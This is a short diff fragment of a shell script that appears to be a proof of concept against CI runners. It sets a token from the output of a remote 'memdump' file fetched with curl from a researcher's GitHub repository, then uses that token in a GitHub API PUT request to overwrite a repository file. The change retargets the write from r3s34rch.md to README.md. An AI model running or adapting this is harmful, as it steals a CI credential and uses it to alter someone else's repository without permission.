@@ -12,13 +12,13 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 #curl \
 #  -H "Accept: application/vnd.github.v3+json" \
 #  -H "Authorization: token $TOKEN_VAL" \
-#  "https://api.github.com/repos/${REPO}/contents/r3s34rch.md"
+#  "https://api.github.com/repos/${REPO}/contents/README.md"
 
 curl -i \
     -X PUT \
     -H "Accept: application/vnd.github.v3+json" \
     -H "Authorization: token $TOKEN_VAL" \
-    "https://api.github.com/repos/${REPO}/contents/r3s34rch.md" \
+    "https://api.github.com/repos/${REPO}/contents/README.md" \
     -d '{"message":"message","content":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
             
 #gh api --silent \
